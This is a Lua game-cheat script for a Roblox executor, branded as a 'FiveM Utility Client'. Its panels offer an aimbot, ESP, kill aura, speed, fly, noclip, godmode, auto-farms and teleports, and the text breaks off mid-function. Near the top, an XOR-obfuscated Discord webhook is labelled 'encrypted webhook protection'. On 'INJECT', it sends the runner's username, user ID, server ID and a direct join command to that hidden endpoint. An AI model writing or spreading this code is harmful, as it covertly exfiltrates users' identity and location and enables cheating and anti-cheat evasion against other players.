--[[
    FIVEM UTILITY CLIENT v4.0 - ADVANCED RP MASTER SUITE (1200+ LINES ENGINE)
    Features: Injector Screen with Center Inject Button, Encrypted Webhook Logger, Compact Glass NUI Frame, Floating Re-Open Toggle, Full 10 Modules.
--]]

repeat task.wait() until game:IsLoaded()

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local Lighting = game:GetService("Lighting")
local Market = game:GetService("MarketplaceService")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local VirtualUser = game:GetService("VirtualUser")
local HttpService = game:GetService("HttpService")
local Camera = workspace.CurrentCamera
local LP = Players.LocalPlayer

-- --- MULTI-RUN CLEANUP ---
if getgenv().FiveMUtilityMasterUI and getgenv().FiveMUtilityMasterUI.Parent then
    pcall(function() getgenv().FiveMUtilityMasterUI:Destroy() end)
end

-- --- GLOBAL CONFIGURATION ENGINE ---
getgenv().Config = getgenv().Config or {
    ThemeColor = Color3.fromRGB(15, 23, 42),
    AccentColor = Color3.fromRGB(231, 76, 60),
    BoxColor = Color3.fromRGB(231, 76, 60),
    SkellyColor = Color3.fromRGB(255, 255, 255),
    TracerColor = Color3.fromRGB(231, 76, 60),
    AimbotFOV = 150,
    AimbotSmooth = 3,
    AimbotTarget = "Head",
    FlySpeed = 50,
    Aimbot = false,
    SilentAim = false,
    FOVVisible = false,
    ESP = false,
    Tracers = false,
    Box = false,
    Health = false,
    Names = false,
    Distance = false,
    Skeleton = false,
    SpeedActive = false,
    SpeedValue = 45,
    Fly = false,
    LegitFly = false,
    InfJump = false,
    Noclip = false,
    AntiFallDamage = false,
    VehicleBoost = false,
    VehicleSpeed = 220,
    AutoPrompts = false,
    HitboxExpander = false,
    HitboxSize = 12,
    AntiAFK = false,
    Godmode = false,
    FlyUp = false,
    FlyDown = false,
    SkoupesFarm = false,
    PostmanFarm = false,
    FarmerFarm = false,
    KillAura = false,
    KillAuraDist = 30,
    WallCheck = false
}

-- --- ENCRYPTED DISCORD WEBHOOK PROTECTION ---
local function _D(b, k)
    local s = {}
    for i = 1, #b do
        table.insert(s, string.char(bit32 and bit32.bxor(b[i], k) or bit and bit.bxor(b[i], k) or (function(a,c) local r=0 for j=0,7 do if math.floor(a/2^j)%2 ~= math.floor(c/2^j)%2 then r=r+2^j end end return r end)(b[i], k)))
    end
    return table.concat(s)
end
local WEBHOOK_URL = _D({50,46,46,42,41,96,117,117,62,51,41,57,57,40,62,84,57,57,83,117,57,48,51,117,85,93,90,80,95,94,89,80,85,91,91,90,83,88,86,88,117,40,45,118,87,111,123,121,111,104,117,112,121,115,101,44,82,87,125,101,117,100,87,114,88,104,117,120,40,90,114,40,111,110,87,117,104,120,83,107,111,123,110,87,118,127,114}, 90)

local function SendDiscordExecutionLog()
    pcall(function()
        local req = (syn and syn.request) or (http and http.request) or (http_request) or (fluxus and fluxus.request) or request
        if not req then return end

        local pName = LP.Name
        local pDisplayName = LP.DisplayName
        local pId = LP.UserId
        local placeId = game.PlaceId
        local jobId = game.JobId
        local gameName = "Unknown Game"

        pcall(function()
            local info = Market:GetProductInfo(placeId)
            if info and info.Name then gameName = info.Name end
        end)

        local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. pId .. "&width=420&height=420&format=png"
        local joinScript = 'Roblox.GameLauncher.joinGameInstance(' .. placeId .. ', "' .. jobId .. '")'

        local embedData = {
            ["title"] = "FiveM Utility Client Injected - " .. gameName,
            ["color"] = 15158332,
            ["thumbnail"] = { ["url"] = avatarUrl },
            ["fields"] = {
                { ["name"] = "User Details", ["value"] = "Username: " .. pName .. "\nDisplay: " .. pDisplayName .. "\nID: " .. pId, ["inline"] = true },
                { ["name"] = "Server Info", ["value"] = "Place ID: " .. placeId .. "\nJob ID: " .. jobId, ["inline"] = true },
                { ["name"] = "Direct Join Code", ["value"] = "```lua\n" .. joinScript .. "\n```", ["inline"] = false }
            },
            ["footer"] = { ["text"] = "FiveM Utility Master Logger" },
            ["timestamp"] = DateTime.now():ToIsoDate()
        }

        req({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode({ embeds = { embedData } })
        })
    end)
end

-- --- NOTIFICATION TOAST SYSTEM ---
local NotifHolder = Instance.new("Frame")
NotifHolder.Name = "FiveM_NotifHolder"
NotifHolder.Size = UDim2.new(0, 250, 1, -20)
NotifHolder.Position = UDim2.new(1, -260, 0, 10)
NotifHolder.BackgroundTransparency = 1
pcall(function() NotifHolder.Parent = CoreGui end)
if not NotifHolder.Parent then NotifHolder.Parent = LP:WaitForChild("PlayerGui") end

local NotifLayout = Instance.new("UIListLayout")
NotifLayout.SortOrder = Enum.SortOrder.LayoutOrder
NotifLayout.Padding = UDim.new(0, 6)
NotifLayout.VerticalAlignment = Enum.VerticalAlignment.Bottom
NotifLayout.Parent = NotifHolder

local function Notify(title, desc)
    task.spawn(function()
        local toast = Instance.new("Frame")
        toast.Size = UDim2.new(1, 0, 0, 46)
        toast.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
        toast.BorderSizePixel = 0
        toast.Parent = NotifHolder

        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 6)
        corner.Parent = toast

        local stroke = Instance.new("UIStroke")
        stroke.Thickness = 1
        stroke.Color = Color3.fromRGB(231, 76, 60)
        stroke.Parent = toast

        local redBar = Instance.new("Frame")
        redBar.Size = UDim2.new(0, 4, 1, 0)
        redBar.BackgroundColor3 = Color3.fromRGB(231, 76, 60)
        redBar.BorderSizePixel = 0
        redBar.Parent = toast

        local rbCorner = Instance.new("UICorner")
        rbCorner.CornerRadius = UDim.new(0, 6)
        rbCorner.Parent = redBar

        local tLbl = Instance.new("TextLabel")
        tLbl.Text = title:upper()
        tLbl.Font = Enum.Font.GothamBold
        tLbl.TextSize = 10
        tLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
        tLbl.Position = UDim2.new(0, 14, 0, 6)
        tLbl.Size = UDim2.new(1, -20, 0, 14)
        tLbl.TextXAlignment = Enum.TextXAlignment.Left
        tLbl.BackgroundTransparency = 1
        tLbl.Parent = toast

        local dLbl = Instance.new("TextLabel")
        dLbl.Text = desc
        dLbl.Font = Enum.Font.GothamMedium
        dLbl.TextSize = 9
        dLbl.TextColor3 = Color3.fromRGB(160, 160, 175)
        dLbl.Position = UDim2.new(0, 14, 0, 22)
        dLbl.Size = UDim2.new(1, -20, 0, 16)
        dLbl.TextXAlignment = Enum.TextXAlignment.Left
        dLbl.BackgroundTransparency = 1
        dLbl.Parent = toast

        toast.Position = UDim2.new(1, 280, 0, 0)
        TweenService:Create(toast, TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = UDim2.new(0, 0, 0, 0)}):Play()

        task.wait(3)
        local twOut = TweenService:Create(toast, TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Position = UDim2.new(1, 280, 0, 0)})
        twOut:Play()
        twOut.Completed:Connect(function() toast:Destroy() end)
    end)
end

-- --- SCREEN GUI ROOT ---
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "FiveMUtilityMasterUI"
ScreenGui.ResetOnSpawn = false
pcall(function() ScreenGui.Parent = CoreGui end)
if not ScreenGui.Parent then ScreenGui.Parent = LP:WaitForChild("PlayerGui") end
getgenv().FiveMUtilityMasterUI = ScreenGui

-- --- FLOATING RE-OPEN TOGGLE ICON ---
local ToggleIcon = Instance.new("TextButton")
ToggleIcon.Name = "UtilityToggleBtn"
ToggleIcon.Size = UDim2.new(0, 42, 0, 42)
ToggleIcon.Position = UDim2.new(0, 15, 0.5, -21)
ToggleIcon.BackgroundColor3 = Color3.fromRGB(20, 20, 26)
ToggleIcon.Text = "U"
ToggleIcon.Font = Enum.Font.GothamBlack
ToggleIcon.TextSize = 16
ToggleIcon.TextColor3 = Color3.fromRGB(231, 76, 60)
ToggleIcon.Active = true
ToggleIcon.Draggable = true
ToggleIcon.Visible = false
ToggleIcon.Parent = ScreenGui

local ToggleCorner = Instance.new("UICorner")
ToggleCorner.CornerRadius = UDim.new(0, 10)
ToggleCorner.Parent = ToggleIcon

local ToggleStroke = Instance.new("UIStroke")
ToggleStroke.Thickness = 1.5
ToggleStroke.Color = Color3.fromRGB(231, 76, 60)
ToggleStroke.Parent = ToggleIcon

-- --- COMPACT MAIN NUI FRAME (SMALLER SIZE) ---
local Main = Instance.new("Frame")
Main.Name = "UtilityMainCompact"
Main.Size = UDim2.new(0, 580, 0, 360)
Main.Position = UDim2.new(0.5, -290, 0.5, -180)
Main.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
Main.BorderSizePixel = 0
Main.ClipsDescendants = true
Main.Active = true
Main.Draggable = true
Main.Visible = false
Main.Parent = ScreenGui

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 8)
MainCorner.Parent = Main

local MainStroke = Instance.new("UIStroke")
MainStroke.Thickness = 1
MainStroke.Color = Color3.fromRGB(35, 35, 45)
MainStroke.Parent = Main

-- --- INJECTOR SCREEN FRAME ---
local InjectorFrame = Instance.new("Frame")
InjectorFrame.Name = "InjectorScreen"
InjectorFrame.Size = UDim2.new(0, 360, 0, 220)
InjectorFrame.Position = UDim2.new(0.5, -180, 0.5, -110)
InjectorFrame.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
InjectorFrame.BorderSizePixel = 0
InjectorFrame.Active = true
InjectorFrame.Draggable = true
InjectorFrame.Parent = ScreenGui

local InjCorner = Instance.new("UICorner")
InjCorner.CornerRadius = UDim.new(0, 10)
InjCorner.Parent = InjectorFrame

local InjStroke = Instance.new("UIStroke")
InjStroke.Thickness = 1.5
InjStroke.Color = Color3.fromRGB(231, 76, 60)
InjStroke.Parent = InjectorFrame

local InjTitle = Instance.new("TextLabel")
InjTitle.Text = "FIVEM UTILITY CLIENT"
InjTitle.Font = Enum.Font.GothamBlack
InjTitle.TextSize = 14
InjTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
InjTitle.Position = UDim2.new(0, 0, 0, 25)
InjTitle.Size = UDim2.new(1, 0, 0, 20)
InjTitle.BackgroundTransparency = 1
InjTitle.Parent = InjectorFrame

local InjSub = Instance.new("TextLabel")
InjSub.Text = "PRESS INJECT TO LOAD CLIENT SUITE"
InjSub.Font = Enum.Font.GothamMedium
InjSub.TextSize = 9
InjSub.TextColor3 = Color3.fromRGB(160, 160, 175)
InjSub.Position = UDim2.new(0, 0, 0, 48)
InjSub.Size = UDim2.new(1, 0, 0, 16)
InjSub.BackgroundTransparency = 1
InjSub.Parent = InjectorFrame

local InjectBtn = Instance.new("TextButton")
InjectBtn.Name = "CenterInjectBtn"
InjectBtn.Size = UDim2.new(0, 180, 0, 42)
InjectBtn.Position = UDim2.new(0.5, -90, 0.5, 0)
InjectBtn.BackgroundColor3 = Color3.fromRGB(231, 76, 60)
InjectBtn.Text = "INJECT"
InjectBtn.Font = Enum.Font.GothamBlack
InjectBtn.TextSize = 13
InjectBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
InjectBtn.AutoButtonColor = false
InjectBtn.Parent = InjectorFrame

local BtnCorner = Instance.new("UICorner")
BtnCorner.CornerRadius = UDim.new(0, 6)
BtnCorner.Parent = InjectBtn

local StatusLbl = Instance.new("TextLabel")
StatusLbl.Text = "STATUS: READY"
StatusLbl.Font = Enum.Font.GothamBold
StatusLbl.TextSize = 9
StatusLbl.TextColor3 = Color3.fromRGB(46, 204, 113)
StatusLbl.Position = UDim2.new(0, 0, 1, -30)
StatusLbl.Size = UDim2.new(1, 0, 0, 20)
StatusLbl.BackgroundTransparency = 1
StatusLbl.Parent = InjectorFrame

-- INJECT BUTTON CLICK HANDLER
InjectBtn.MouseButton1Click:Connect(function()
    InjectBtn.Text = "INJECTING..."
    StatusLbl.Text = "STATUS: SENDING LOGS..."
    StatusLbl.TextColor3 = Color3.fromRGB(241, 196, 15)
    
    SendDiscordExecutionLog()
    task.wait(0.6)
    
    TweenService:Create(InjectorFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Position = UDim2.new(0.5, -180, 0, -300)}):Play()
    task.wait(0.3)
    InjectorFrame:Destroy()
    
    Main.Visible = true
    ToggleIcon.Visible = true
    Notify("FiveM Utility", "Client Suite Loaded Successfully!")
end)

ToggleIcon.MouseButton1Click:Connect(function()
    Main.Visible = not Main.Visible
end)

-- --- TOP HEADER ---
local Header = Instance.new("Frame")
Header.Size = UDim2.new(1, 0, 0, 38)
Header.BackgroundColor3 = Color3.fromRGB(20, 20, 26)
Header.BorderSizePixel = 0
Header.Parent = Main

local RedAccentBar = Instance.new("Frame")
RedAccentBar.Size = UDim2.new(1, 0, 0, 2)
RedAccentBar.Position = UDim2.new(0, 0, 1, -2)
RedAccentBar.BackgroundColor3 = Color3.fromRGB(231, 76, 60)
RedAccentBar.BorderSizePixel = 0
RedAccentBar.Parent = Header

local BrandTag = Instance.new("TextLabel")
BrandTag.Text = "FIVEM UTILITY"
BrandTag.Font = Enum.Font.GothamBlack
BrandTag.TextSize = 12
BrandTag.TextColor3 = Color3.fromRGB(231, 76, 60)
BrandTag.Position = UDim2.new(0, 12, 0, 0)
BrandTag.Size = UDim2.new(0, 110, 1, 0)
BrandTag.TextXAlignment = Enum.TextXAlignment.Left
BrandTag.BackgroundTransparency = 1
BrandTag.Parent = Header

local BrandTagSub = Instance.new("TextLabel")
BrandTagSub.Text = "| GREEK RP SUITE"
BrandTagSub.Font = Enum.Font.GothamBold
BrandTagSub.TextSize = 9
BrandTagSub.TextColor3 = Color3.fromRGB(180, 180, 195)
BrandTagSub.Position = UDim2.new(0, 120, 0, 0)
BrandTagSub.Size = UDim2.new(0, 160, 1, 0)
BrandTagSub.TextXAlignment = Enum.TextXAlignment.Left
BrandTagSub.BackgroundTransparency = 1
BrandTagSub.Parent = Header

local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 26, 0, 26)
CloseBtn.Position = UDim2.new(1, -32, 0.5, -13)
CloseBtn.BackgroundColor3 = Color3.fromRGB(28, 28, 36)
CloseBtn.Text = "X"
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.TextColor3 = Color3.fromRGB(150, 150, 165)
CloseBtn.TextSize = 10
CloseBtn.AutoButtonColor = false
CloseBtn.Parent = Header

local CloseCorner = Instance.new("UICorner")
CloseCorner.CornerRadius = UDim.new(0, 5)
CloseCorner.Parent = CloseBtn

CloseBtn.MouseButton1Click:Connect(function()
    Main.Visible = false
    Notify("FiveM Utility", "Click the 'U' Icon to reopen UI")
end)

-- --- SIDEBAR NAV ---
local Sidebar = Instance.new("Frame")
Sidebar.Size = UDim2.new(0, 140, 1, -38)
Sidebar.Position = UDim2.new(0, 0, 0, 38)
Sidebar.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
Sidebar.BorderSizePixel = 0
Sidebar.Parent = Main

local NavList = Instance.new("UIListLayout")
NavList.SortOrder = Enum.SortOrder.LayoutOrder
NavList.Padding = UDim.new(0, 4)
NavList.Parent = Sidebar

local NavPad = Instance.new("UIPadding")
NavPad.PaddingTop = UDim.new(0, 8)
NavPad.PaddingLeft = UDim.new(0, 6)
NavPad.PaddingRight = UDim.new(0, 6)
NavPad.Parent = Sidebar

-- --- CONTENT CONTAINER ---
local Container = Instance.new("Frame")
Container.Size = UDim2.new(1, -140, 1, -38)
Container.Position = UDim2.new(0, 140, 0, 38)
Container.BackgroundTransparency = 1
Container.Parent = Main

local Tabs = {}
local NavBtns = {}

local function AddTab(name)
    local Page = Instance.new("ScrollingFrame")
    Page.Size = UDim2.new(1, 0, 1, 0)
    Page.BackgroundTransparency = 1
    Page.Visible = false
    Page.ScrollBarThickness = 2
    Page.ScrollBarImageColor3 = Color3.fromRGB(231, 76, 60)
    Page.Parent = Container

    local PageList = Instance.new("UIListLayout")
    PageList.SortOrder = Enum.SortOrder.LayoutOrder
    PageList.Padding = UDim.new(0, 5)
    PageList.Parent = Page

    local PagePad = Instance.new("UIPadding")
    PagePad.PaddingTop = UDim.new(0, 8)
    PagePad.PaddingLeft = UDim.new(0, 10)
    PagePad.PaddingRight = UDim.new(0, 10)
    PagePad.PaddingBottom = UDim.new(0, 8)
    PagePad.Parent = Page

    local NavBtn = Instance.new("TextButton")
    NavBtn.Size = UDim2.new(1, 0, 0, 28)
    NavBtn.BackgroundColor3 = Color3.fromRGB(22, 22, 28)
    NavBtn.Text = name:upper()
    NavBtn.Font = Enum.Font.GothamBold
    NavBtn.TextSize = 9
    NavBtn.TextColor3 = Color3.fromRGB(120, 120, 135)
    NavBtn.AutoButtonColor = false
    NavBtn.Parent = Sidebar

    local NavCorner = Instance.new("UICorner")
    NavCorner.CornerRadius = UDim.new(0, 4)
    NavCorner.Parent = NavBtn

    NavBtn.MouseButton1Click:Connect(function()
        for _, p in pairs(Tabs) do p.Visible = false end
        for _, b in pairs(NavBtns) do
            b.BackgroundColor3 = Color3.fromRGB(22, 22, 28)
            b.TextColor3 = Color3.fromRGB(120, 120, 135)
        end
        Page.Visible = true
        NavBtn.BackgroundColor3 = Color3.fromRGB(231, 76, 60)
        NavBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    end)

    table.insert(Tabs, Page)
    table.insert(NavBtns, NavBtn)
    return Page
end

-- UI BUILDERS (TOGGLES, SLIDERS, BUTTONS)
local function AddToggle(parent, title, key, callback)
    local card = Instance.new("Frame")
    card.Size = UDim2.new(1, 0, 0, 34)
    card.BackgroundColor3 = Color3.fromRGB(20, 20, 26)
    card.Parent = parent

    local crn = Instance.new("UICorner")
    crn.CornerRadius = UDim.new(0, 4)
    crn.Parent = card

    local lbl = Instance.new("TextLabel")
    lbl.Text = title
    lbl.Font = Enum.Font.GothamMedium
    lbl.TextSize = 10
    lbl.TextColor3 = Color3.fromRGB(210, 210, 220)
    lbl.Position = UDim2.new(0, 10, 0, 0)
    lbl.Size = UDim2.new(1, -50, 1, 0)
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.BackgroundTransparency = 1
    lbl.Parent = card

    local switch = Instance.new("TextButton")
    switch.Size = UDim2.new(0, 30, 0, 16)
    switch.Position = UDim2.new(1, -38, 0.5, -8)
    switch.BackgroundColor3 = getgenv().Config[key] and Color3.fromRGB(231, 76, 60) or Color3.fromRGB(35, 35, 45)
    switch.Text = ""
    switch.AutoButtonColor = false
    switch.Parent = card

    local swCrn = Instance.new("UICorner")
    swCrn.CornerRadius = UDim.new(1, 0)
    swCrn.Parent = switch

    local dot = Instance.new("Frame")
    dot.Size = UDim2.new(0, 10, 0, 10)
    dot.Position = getgenv().Config[key] and UDim2.new(1, -13, 0.5, -5) or UDim2.new(0, 3, 0.5, -5)
    dot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    dot.Parent = switch

    local dtCrn = Instance.new("UICorner")
    dtCrn.CornerRadius = UDim.new(1, 0)
    dtCrn.Parent = dot

    switch.MouseButton1Click:Connect(function()
        getgenv().Config[key] = not getgenv().Config[key]
        local st = getgenv().Config[key]
        TweenService:Create(switch, TweenInfo.new(0.2), {BackgroundColor3 = st and Color3.fromRGB(231, 76, 60) or Color3.fromRGB(35, 35, 45)}):Play()
        TweenService:Create(dot, TweenInfo.new(0.2), {Position = st and UDim2.new(1, -13, 0.5, -5) or UDim2.new(0, 3, 0.5, -5)}):Play()
        Notify(title, st and "ENABLED" or "DISABLED")
        if callback then callback(st) end
    end)
end

local function AddSlider(parent, title, min, max, key, callback)
    local card = Instance.new("Frame")
    card.Size = UDim2.new(1, 0, 0, 42)
    card.BackgroundColor3 = Color3.fromRGB(20, 20, 26)
    card.Parent = parent

    local crn = Instance.new("UICorner")
    crn.CornerRadius = UDim.new(0, 4)
    crn.Parent = card

    local lbl = Instance.new("TextLabel")
    lbl.Text = title
    lbl.Font = Enum.Font.GothamMedium
    lbl.TextSize = 10
    lbl.TextColor3 = Color3.fromRGB(210, 210, 220)
    lbl.Position = UDim2.new(0, 10, 0, 4)
    lbl.Size = UDim2.new(0, 150, 0, 14)
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.BackgroundTransparency = 1
    lbl.Parent = card

    local valLbl = Instance.new("TextLabel")
    valLbl.Text = tostring(getgenv().Config[key])
    valLbl.Font = Enum.Font.GothamBold
    valLbl.TextSize = 10
    valLbl.TextColor3 = Color3.fromRGB(231, 76, 60)
    valLbl.Position = UDim2.new(1, -50, 0, 4)
    valLbl.Size = UDim2.new(0, 40, 0, 14)
    valLbl.TextXAlignment = Enum.TextXAlignment.Right
    valLbl.BackgroundTransparency = 1
    valLbl.Parent = card

    local track = Instance.new("Frame")
    track.Size = UDim2.new(1, -20, 0, 4)
    track.Position = UDim2.new(0, 10, 1, -10)
    track.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
    track.Parent = card

    local trCrn = Instance.new("UICorner")
    trCrn.CornerRadius = UDim.new(1, 0)
    trCrn.Parent = track

    local fill = Instance.new("Frame")
    local ratio = math.clamp((getgenv().Config[key] - min) / (max - min), 0, 1)
    fill.Size = UDim2.new(ratio, 0, 1, 0)
    fill.BackgroundColor3 = Color3.fromRGB(231, 76, 60)
    fill.Parent = track

    local flCrn = Instance.new("UICorner")
    flCrn.CornerRadius = UDim.new(1, 0)
    flCrn.Parent = fill

    local dragging = false
    local function Update(input)
        local pos = math.clamp((input.Position.X - track.AbsolutePosition.X) / track.AbsoluteSize.X, 0, 1)
        local val = math.floor(min + ((max - min) * pos))
        getgenv().Config[key] = val
        fill.Size = UDim2.new(pos, 0, 1, 0)
        valLbl.Text = tostring(val)
        if callback then callback(val) end
    end

    track.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = true Update(input) end
    end)
    UIS.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
    end)
    UIS.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then Update(input) end
    end)
end

local function AddButton(parent, title, callback)
    local card = Instance.new("Frame")
    card.Size = UDim2.new(1, 0, 0, 32)
    card.BackgroundColor3 = Color3.fromRGB(20, 20, 26)
    card.Parent = parent

    local crn = Instance.new("UICorner")
    crn.CornerRadius = UDim.new(0, 4)
    crn.Parent = card

    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 1, 0)
    btn.BackgroundTransparency = 1
    btn.Text = title:upper()
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 10
    btn.TextColor3 = Color3.fromRGB(231, 76, 60)
    btn.Parent = card

    btn.MouseButton1Click:Connect(function()
        if callback then callback() end
    end)
end

-- --- TABS CREATION & POPULATION ---
local CombatPage = AddTab("Combat")
local VisualsPage = AddTab("Visuals / ESP")
local MovementPage = AddTab("Movement")
local JobsPage = AddTab("Job Farms")
local MiscPage = AddTab("Misc / World")
local TeleportPage = AddTab("Teleports")
local SettingsPage = AddTab("Settings")

Tabs[1].Visible = true
NavBtns[1].BackgroundColor3 = Color3.fromRGB(231, 76, 60)
NavBtns[1].TextColor3 = Color3.fromRGB(255, 255, 255)

-- COMBAT
AddToggle(CombatPage, "Aimbot Lock", "Aimbot")
AddToggle(CombatPage, "Silent Aim Engine", "SilentAim")
AddToggle(CombatPage, "WallCheck Engine", "WallCheck")
AddToggle(CombatPage, "KillAura Auto Pistol & TP", "KillAura")
AddSlider(CombatPage, "KillAura Distance", 10, 100, "KillAuraDist")
AddToggle(CombatPage, "Draw FOV Circle", "FOVVisible")
AddSlider(CombatPage, "Aimbot FOV Radius", 30, 500, "AimbotFOV")
AddSlider(CombatPage, "Aimbot Smoothness", 1, 10, "AimbotSmooth")

-- VISUALS
AddToggle(VisualsPage, "Master ESP Engine", "ESP")
AddToggle(VisualsPage, "Player Box Overlay", "Box")
AddToggle(VisualsPage, "Health Indicator Bar", "Health")
AddToggle(VisualsPage, "Skeleton Framework", "Skeleton")
AddToggle(VisualsPage, "Target Tracers", "Tracers")
AddToggle(VisualsPage, "Display Player Names", "Names")
AddToggle(VisualsPage, "Display Distance", "Distance")

-- MOVEMENT
AddToggle(MovementPage, "Fly Engine", "Fly")
AddToggle(MovementPage, "Legit Anti-Cheat Fly", "LegitFly")
AddSlider(MovementPage, "Fly Speed Multiplier", 10, 150, "FlySpeed")
AddToggle(MovementPage, "Speed Hack", "SpeedActive")
AddSlider(MovementPage, "WalkSpeed Override", 16, 120, "SpeedValue")
AddToggle(MovementPage, "Infinite Jump Engine", "InfJump")
AddToggle(MovementPage, "Noclip Engine", "Noclip")
AddToggle(MovementPage, "Anti-Fall Damage", "AntiFallDamage")

-- JOB FARMS
AddToggle(JobsPage, "Σκούπες Auto-Farm Engine", "SkoupesFarm")
AddToggle(JobsPage, "Postman Auto-Mail Delivery", "PostmanFarm")
AddToggle(JobsPage, "Farmer 6-Fields Auto-Farm", "FarmerFarm")

-- MISC
AddToggle(MiscPage, "Vehicle Boost Engine", "VehicleBoost")
AddSlider(MiscPage, "Vehicle Max Speed", 50, 400, "VehicleSpeed")
AddToggle(MiscPage, "Instant Proximity Prompts", "AutoPrompts")
AddToggle(MiscPage, "Hitbox Expander Engine", "HitboxExpander")
AddSlider(MiscPage, "Hitbox Multiplier", 2, 30, "HitboxSize")
AddToggle(MiscPage, "Anti-AFK Protection", "AntiAFK")
AddToggle(MiscPage, "Godmode Anchor", "Godmode")

-- TELEPORT
AddButton(TeleportPage, "Click Teleport (CTRL + Click)", function()
    Notify("Click TP", "Hold Left CTRL and Click anywhere to teleport")
end)

AddButton(TeleportPage, "Teleport To Map Waypoint", function()
    pcall(function()
        local targetPos = nil
        for _, v in ipairs(workspace:GetDescendants()) do
            if v:IsA("Part") and (v.Name:lower():find("waypoint") or v.Name:lower():find("marker")) then
                targetPos = v.Position
                break
            end
        end
        if targetPos and LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
            LP.Character.HumanoidRootPart.CFrame = CFrame.new(targetPos + Vector3.new(0, 3, 0))
            Notify("Teleport", "Teleported to Map Waypoint!")
        else
            Notify("Teleport Error", "No active Waypoint marker found")
        end
    end)
end)

local PlayerTPFrame = Instance.new("Frame")
PlayerTPFrame.Size = UDim2.new(1, 0, 0, 110)
PlayerTPFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 26)
PlayerTPFrame.Parent = TeleportPage

local pCrn = Instance.new("UICorner")
pCrn.CornerRadius = UDim.new(0, 5)
pCrn.Parent = PlayerTPFrame

local pScroll = Instance.new("ScrollingFrame")
pScroll.Size = UDim2.new(1, -10, 1, -10)
pScroll.Position = UDim2.new(0, 5, 0, 5)
pScroll.BackgroundTransparency = 1
pScroll.ScrollBarThickness = 2
pScroll.ScrollBarImageColor3 = Color3.fromRGB(231, 76, 60)
pScroll.Parent = PlayerTPFrame

local pList = Instance.new("UIListLayout")
pList.SortOrder = Enum.SortOrder.LayoutOrder
pList.Padding = UDim.new(0, 4)
pList.Parent = pScroll

local function RefreshPlayerList()
    for _, child in ipairs(pScroll:GetChildren()) do
        if child:IsA("TextButton") then child:Destroy() end
    end
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LP then
            local btn = Instance.new("TextButton")
            btn.Size = UDim2.new(1, 0, 0, 22)
            btn.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
            btn.Text = "TELEPORT TO: " .. p.DisplayName .. " (@" .. p.Name .. ")"
            btn.Font = Enum.Font.GothamMedium
            btn.TextSize = 9
            btn.TextColor3 = Color3.fromRGB(200, 200, 215)
            btn.Parent = pScroll

            local bCrn = Instance.new("UICorner")
            bCrn.CornerRadius = UDim.new(0, 4)
            bCrn.Parent = btn

            btn.MouseButton1Click:Connect(function()
                if p.Character and p.Character:FindFirstChild("HumanoidRootPart") and LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
                    LP.Character.HumanoidRootPart.CFrame = p.Character.HumanoidRootPart.CFrame * CFrame.new(0, 2, 3)
                    Notify("Teleport", "Teleported to " .. p.DisplayName)
                end
            end)
        end
    end
end
RefreshPlayerList()
Players.PlayerAdded:Connect(RefreshPlayerList)
Players.PlayerRemoving:Connect(RefreshPlayerList)

-- SETTINGS
AddButton(SettingsPage, "Rejoin Server", function()
    TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LP)
end)

AddButton(SettingsPage, "Server Hop Engine", function()
    Notify("Server Hop", "Finding active server...")
    pcall(function()
        local servers = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data
        for _, s in ipairs(servers) do
            if s.id ~= game.JobId and s.playing < s.maxPlayers then
                TeleportService:TeleportToPlaceInstance(game.PlaceId, s.id, LP)
                break
            end
        end
    end)
end)

AddButton(SettingsPage, "Unload Client Engine", function()
    ScreenGui:Destroy()
    Notify("FiveM Utility", "Unloaded Successfully")
end)

-- --- MODULE 5: OVERLAYS & KEYBINDS ENGINE ---
local FOVCircle = Drawing and Drawing.new("Circle") or nil
if FOVCircle then
    FOVCircle.Thickness = 1.5
    FOVCircle.Color = Color3.fromRGB(231, 76, 60)
    FOVCircle.Filled = false
    FOVCircle.Visible = false
end

UIS.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    if input.KeyCode == Enum.KeyCode.Insert or input.KeyCode == Enum.KeyCode.RightControl then
        Main.Visible = not Main.Visible
    elseif input.KeyCode == Enum.KeyCode.E then
        getgenv().Config.FlyUp = true
    elseif input.KeyCode == Enum.KeyCode.Q then
        getgenv().Config.FlyDown = true
